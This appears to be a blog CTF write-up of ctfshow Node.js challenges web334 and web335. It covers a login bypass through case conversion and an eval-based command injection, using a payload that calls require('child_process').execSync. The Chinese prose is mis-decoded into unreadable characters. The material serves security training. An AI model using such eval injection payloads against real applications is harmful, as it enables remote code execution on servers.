<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="Regulus"/><meta name="copyright" content="Regulus"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="jsåŸå‹é“¾æ±¡æŸ“,jsä»£ç å®¡è®¡,jså‘½ä»¤æ‰§è¡Œ"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="ctfshow_nodejs | Meiçš„å°çª"/><meta name="apple-mobile-web-app-title" content="ctfshow_nodejs | Meiçš„å°çª"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2025/07/02/ctfshow-nodejs/"/><meta name="description" content="ctfshow_nodejså‰è¨€jsä»£ç å®¡è®¡å¤ªå·®äº†ï¼Œæƒ³é”»ç‚¼ä¸€ä¸‹å°±å»å†™äº†ä¸€ä¸‹ctfshowï¼Œæ˜å¤©å°±è€ƒæœ€åä¸€é—¨è¿‘ä»£å²äº†ï¼Œåƒä¸‡ä¸è¦æŒ‚ç§‘å•Š web334æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæä¾›äº†æºç ï¼Œä¸‹è½½æ¥çœ‹ 123456&#x2F;&#x2F;user.jsmodule.exports &#x3D; &#123;  items: [    &#123;username: &#x27;CTFSHOW&#x27;, password: &#x27;1...">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow_nodejs | Meiçš„å°çª">
<meta property="og:url" content="http://example.com/2025/07/02/ctfshow-nodejs/index.html">
<meta property="og:site_name" content="Meiçš„å°çª">
<meta property="og:description" content="ctfshow_nodejså‰è¨€jsä»£ç å®¡è®¡å¤ªå·®äº†ï¼Œæƒ³é”»ç‚¼ä¸€ä¸‹å°±å»å†™äº†ä¸€ä¸‹ctfshowï¼Œæ˜å¤©å°±è€ƒæœ€åä¸€é—¨è¿‘ä»£å²äº†ï¼Œåƒä¸‡ä¸è¦æŒ‚ç§‘å•Š web334æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæä¾›äº†æºç ï¼Œä¸‹è½½æ¥çœ‹ 123456&#x2F;&#x2F;user.jsmodule.exports &#x3D; &#123;  items: [    &#123;username: &#x27;CTFSHOW&#x27;, password: &#x27;1...">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025/07/02/ctfshow-nodejs/assets/images/Hexo-Theme-MEOW.png">
<meta property="article:published_time" content="2025-07-02T12:56:09.000Z">
<meta property="article:modified_time" content="2025-12-26T09:12:42.147Z">
<meta property="article:author" content="Regulus">
<meta property="article:tag" content="jsåŸå‹é“¾æ±¡æŸ“">
<meta property="article:tag" content="jsä»£ç å®¡è®¡">
<meta property="article:tag" content="jså‘½ä»¤æ‰§è¡Œ">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2025/07/02/ctfshow-nodejs/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>ctfshow_nodejs | Meiçš„å°çª</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
<link rel="stylesheet" href="/css/style.css">
<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 7.3.0"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="ä¸»é¡µ"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="ä¸»é¡µ"><div>Meiçš„å°çª</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>æ–‡ç« </span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>å½’æ¡£</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>åˆ†ç±»</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>æ ‡ç­¾</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>å…³äº</span></a></li></ul></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="æœç´¢" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>æœç´¢</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="æ‰“å¼€èœå•"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="ä¸»é¡µ"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="ä¸»é¡µ">Meiçš„å°çª</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>æ–‡ç« </span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>å½’æ¡£</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>åˆ†ç±»</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>æ ‡ç­¾</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>å…³äº</span></a></li></ul></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">ã€Œ Meiçš„å°çª ã€</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">ctfshow_nodejs</h1><div class="post-author"><span>ä½œè€…: Regulus</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>å‘è¡¨äº2025-07-02</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>æ›´æ–°äº2025-12-26</span></div></div><div class="post-read"><div class="post-wordcount"><img src="/assets/images/svg/ta/ta-write.svg" class="icon noview" alt="Icon"><span>æ€»å­—æ•°: 3.9kå­—</span></div><div class="post-readtime"><img src="/assets/images/svg/ta/ta-time.svg" class="icon noview" alt="Icon"><span>é˜…è¯»æ—¶é•¿: 14åˆ†é’Ÿ</span></div><div class="post-pageview"><img src="/assets/images/svg/ta/ta-fire.svg" class="icon noview" alt="Icon"><span>è®¿é—®é‡: </span><span id="vercount_value_page_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div><div class="post-attribute"><div class="post-tags"><img src="/assets/images/svg/ta/ta-tag.svg" class="icon noview" alt="Icon"><span><a class="post-tags-link" href="/tags/js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">jsä»£ç å®¡è®¡</a><a class="post-tags-link" href="/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">jsåŸå‹é“¾æ±¡æŸ“</a><a class="post-tags-link" href="/tags/js%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">jså‘½ä»¤æ‰§è¡Œ</a></span></div></div></div><div class="post markdown" indent="false"><h1 id="ctfshow-nodejs"><a href="#ctfshow-nodejs" class="headerlink" title="ctfshow_nodejs"></a>ctfshow_nodejs</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>jsä»£ç å®¡è®¡å¤ªå·®äº†ï¼Œæƒ³é”»ç‚¼ä¸€ä¸‹å°±å»å†™äº†ä¸€ä¸‹ctfshowï¼Œæ˜å¤©å°±è€ƒæœ€åä¸€é—¨è¿‘ä»£å²äº†ï¼Œåƒä¸‡ä¸è¦æŒ‚ç§‘å•Š</p>
<h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p>æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæä¾›äº†æºç ï¼Œä¸‹è½½æ¥çœ‹</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//user.js</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>





<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.js</span></span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> users = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>).<span class="property">items</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;<span class="comment">//ä¸€ä¸ªæ ¡éªŒå‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;<span class="comment">//æ›´ç›®å½•è·¯ç”± ä¹Ÿå°±æ˜¯ç™»å½•ç•Œé¢</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">username</span>, req.<span class="property">body</span>.<span class="property">password</span>);<span class="comment">//è·å–è¯·æ±‚çš„ä¸¤ä¸ªå‚æ•°ä½¿ç”¨å‡½æ•°è¿›è¡Œæ ¡éªŒ</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(user)&#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="title function_">regenerate</span>(<span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>&#125;);        </span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      req.<span class="property">session</span>.<span class="property">loginUser</span> = user.<span class="property">username</span>;</span><br><span class="line">      res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>,<span class="attr">ret_flag</span>:flag&#125;);              </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">1</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;è´¦å·æˆ–å¯†ç é”™è¯¯&#x27;</span>&#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<ol>
<li><strong><code>req.body.username</code> å’Œ <code>req.body.password</code></strong><ul>
<li><code>req.body</code> æ˜¯ Express æ¡†æ¶æä¾›çš„è¯·æ±‚ä½“å¯¹è±¡</li>
<li>ä»å®¢æˆ·ç«¯ POST è¯·æ±‚ä¸­æå–çš„ç”¨æˆ·åå’Œå¯†ç å­—æ®µ</li>
</ul>
</li>
<li><strong>è¿”å›å€¼ <code>user</code></strong><ul>
<li>å¦‚æœæ‰¾åˆ°åŒ¹é…ç”¨æˆ·ï¼šè¿”å›ç”¨æˆ·å¯¹è±¡</li>
<li>å¦‚æœæœªæ‰¾åˆ°åŒ¹é…ç”¨æˆ·ï¼šè¿”å› <code>undefined</code></li>
</ul>
</li>
</ol>
<p>æˆ‘ä»¬ä¸»è¦çœ‹å‡½æ•°</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;<span class="comment">//è¿™æ˜¯ä½¿ç”¨äº†ä¸€ä¸ªfindæ–¹æ³•ï¼Œé€šè¿‡å›è°ƒå‡½æ•°å¯¹å‚æ•°è¿›è¡Œä¸€ä¸ªæ ¡éªŒ éœ€è¦æˆ‘ä»¬è¿›è¡ŒåŒ¹é…</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>itemæ•°ç»„ä¸­åªæœ‰CTFSHOWè¿™ä¸€ä¸ªè´¦å·ï¼Œä½†æ˜¯åé¢æœ‰è¿™ä¸ªå‡½æ•°<code>toUpperCase()</code>ï¼Œå°†æˆ‘ä»¬ä¼ å…¥çš„usernameè¿›è¡Œè½¬å¤§å†™ï¼Œäºæ˜¯æˆ‘ä»¬åªéœ€è¦ä¼ å…¥</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctfshow</span><br><span class="line">123456</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>é¢˜ç›®æç¤ºæˆ‘ä»¬<code>/?eval</code>ï¼Œæˆ‘ä»¬ä¼ å…¥evalå‚æ•°å‘ç°ä¼ å‚ä¼šå›æ˜¾</p>
<p>çœ‹äº†é¢˜è§£å‘ç°æºä»£ç ç±»ä¼¼</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;console.log(xxx)&#x27;</span>)</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>æˆ‘ä»¬çš„è¾“å…¥ä¼šæ”¾åˆ°console.logä¸­å»æ‰§è¡Œï¼Œå°±åƒæˆ‘ä»¬bashä¸­</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> `ls`;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>åç«¯(node.js)è¾“å‡ºåˆ°å‘½ä»¤è¡Œç„¶åè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåœ¨æµè§ˆå™¨ä¸­åˆ™æ˜¯å°†è¾“å…¥è¾“å‡ºåˆ°æ§åˆ¶å°</p>
<p>æˆ‘ä»¬å¡«å…¥çš„å‘½ä»¤æ‰§è¡Œä»£ç ä¼šè¢«è§£ææ‰§è¡Œç„¶åè¾“å‡º</p>
<h3 id="å‘½ä»¤æ‰§è¡Œæ–¹å¼"><a href="#å‘½ä»¤æ‰§è¡Œæ–¹å¼" class="headerlink" title="å‘½ä»¤æ‰§è¡Œæ–¹å¼"></a>å‘½ä»¤æ‰§è¡Œæ–¹å¼</h3><p><strong>Node.js å‘½ä»¤æ‰§è¡Œæ–¹æ³•å¯¹æ¯”è¡¨</strong></p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left"><strong>æ–¹æ³•</strong></th>
<th align="left"><strong>åŒæ­¥&#x2F;å¼‚æ­¥</strong></th>
<th align="left"><strong>ç¤ºä¾‹ä»£ç </strong></th>
<th align="left"><strong>è¿”å›ç»“æœ</strong></th>
<th align="left"><strong>å®‰å…¨é£é™©</strong></th>
<th align="left"><strong>é€‚ç”¨åœºæ™¯</strong></th>
<th align="left"><strong>æ³¨æ„äº‹é¡¹</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><code>execSync</code></strong></td>
<td align="left">åŒæ­¥</td>
<td align="left"><code>const res = require(&#39;child_process&#39;).execSync(&#39;ls&#39;).toString();</code></td>
<td align="left">Buffer&#x2F;stdout</td>
<td align="left">ğŸ”´ é«˜å±</td>
<td align="left">éœ€è¦ç«‹å³è·å–ç»“æœçš„ç®€å•å‘½ä»¤</td>
<td align="left">ç»å¯¹ç¦æ­¢ä¼ å…¥ç”¨æˆ·è¾“å…¥</td>
</tr>
<tr>
<td align="left"><strong><code>spawnSync</code></strong></td>
<td align="left">åŒæ­¥</td>
<td align="left"><code>const res = spawnSync(&#39;ls&#39;, [&#39;-l&#39;], &#123; stdio: &#39;pipe&#39; &#125;);</code></td>
<td align="left">å¯¹è±¡(stdout&#x2F;stderr)</td>
<td align="left">ğŸŸ¡ ä¸­å±</td>
<td align="left">éœ€è¦ç²¾ç»†æ§åˆ¶å‚æ•°çš„å‘½ä»¤</td>
<td align="left">å‚æ•°éœ€ç¡¬ç¼–ç æˆ–ä¸¥æ ¼è¿‡æ»¤</td>
</tr>
<tr>
<td align="left"><strong><code>exec</code></strong></td>
<td align="left">å¼‚æ­¥</td>
<td align="left"><code>exec(&#39;ls&#39;, (err, stdout) =&gt; &#123; console.log(stdout); &#125;);</code></td>
<td align="left">å›è°ƒè¿”å›stdout</td>
<td align="left">ğŸ”´ é«˜å±</td>
<td align="left">ç®€å•å¼‚æ­¥å‘½ä»¤æ‰§è¡Œ</td>
<td align="left">é¿å…ä½¿ç”¨shellè¯­æ³•</td>
</tr>
<tr>
<td align="left"><strong><code>spawn</code></strong></td>
<td align="left">å¼‚æ­¥</td>
<td align="left"><code>const ls = spawn(&#39;ls&#39;, [&#39;-l&#39;]);&lt;br&gt;ls.stdout.on(&#39;data&#39;, (d) =&gt; &#123;...&#125;);</code></td>
<td align="left">æµå¼è¾“å‡º</td>
<td align="left">ğŸŸ¡ ä¸­å±</td>
<td align="left">é•¿æ—¶é—´è¿è¡Œæˆ–å¤§æ•°æ®é‡è¾“å‡º</td>
<td align="left">æ¨èæ›¿ä»£<code>exec</code></td>
</tr>
<tr>
<td align="left"><strong><code>fork</code></strong></td>
<td align="left">å¼‚æ­¥</td>
<td align="left"><code>const child = fork(&#39;script.js&#39;);</code></td>
<td align="left">IPCé€šä¿¡</td>
<td align="left">ğŸŸ¢ ä½å±</td>
<td align="left">å¤šè¿›ç¨‹Node.jsåº”ç”¨</td>
<td align="left">ä»…èƒ½æ‰§è¡ŒNodeè„šæœ¬</td>
</tr>
<tr>
<td align="left"><strong>ShellJS</strong></td>
<td align="left">åŒæ­¥&#x2F;å¼‚æ­¥</td>
<td align="left"><code>shelljs.exec(&#39;ls&#39;);</code></td>
<td align="left">å­—ç¬¦ä¸²&#x2F;stdout</td>
<td align="left">ğŸ”´ é«˜å±</td>
<td align="left">éœ€è¦è·¨å¹³å°æ”¯æŒçš„è„šæœ¬</td>
<td align="left">æœ¬è´¨ä»æ˜¯<code>exec</code>çš„å°è£…</td>
</tr>
<tr>
<td align="left"><strong><code>eval</code>+å‘½ä»¤</strong></td>
<td align="left">åŒæ­¥</td>
<td align="left"><code>eval(&quot;require(&#39;child_process&#39;).execSync(&#39;ls&#39;)&quot;);</code></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table></div>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™äº›å‘½ä»¤æ‰§è¡Œä»£ç ï¼Œç„¶åå…ˆè§£æä¸€ä¸‹</p>
<p><strong>require(â€˜child_processâ€™).execSync(â€˜lsâ€™).toString();</strong></p>
<p> <code>require(&#39;child_process&#39;)</code></p>
<ul>
<li>Node.jsæ ¸å¿ƒæ¨¡å—ï¼Œæä¾›åˆ›å»ºå­è¿›ç¨‹çš„èƒ½åŠ›</li>
<li>åŒ…å«å¤šä¸ªæ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ï¼š<ul>
<li><code>execSync</code>ï¼šåŒæ­¥æ‰§è¡Œ</li>
<li><code>exec</code>ï¼šå¼‚æ­¥æ‰§è¡Œ</li>
<li><code>spawn</code>ï¼šæ›´åº•å±‚çš„è¿›ç¨‹ç”Ÿæˆ</li>
</ul>
</li>
</ul>
<p>ç”±äºå‘½ä»¤æ‰§è¡Œç»“æœä¸æ˜¯å­—ç¬¦ä¸²è€Œæ˜¯äºŒè¿›åˆ¶</p>
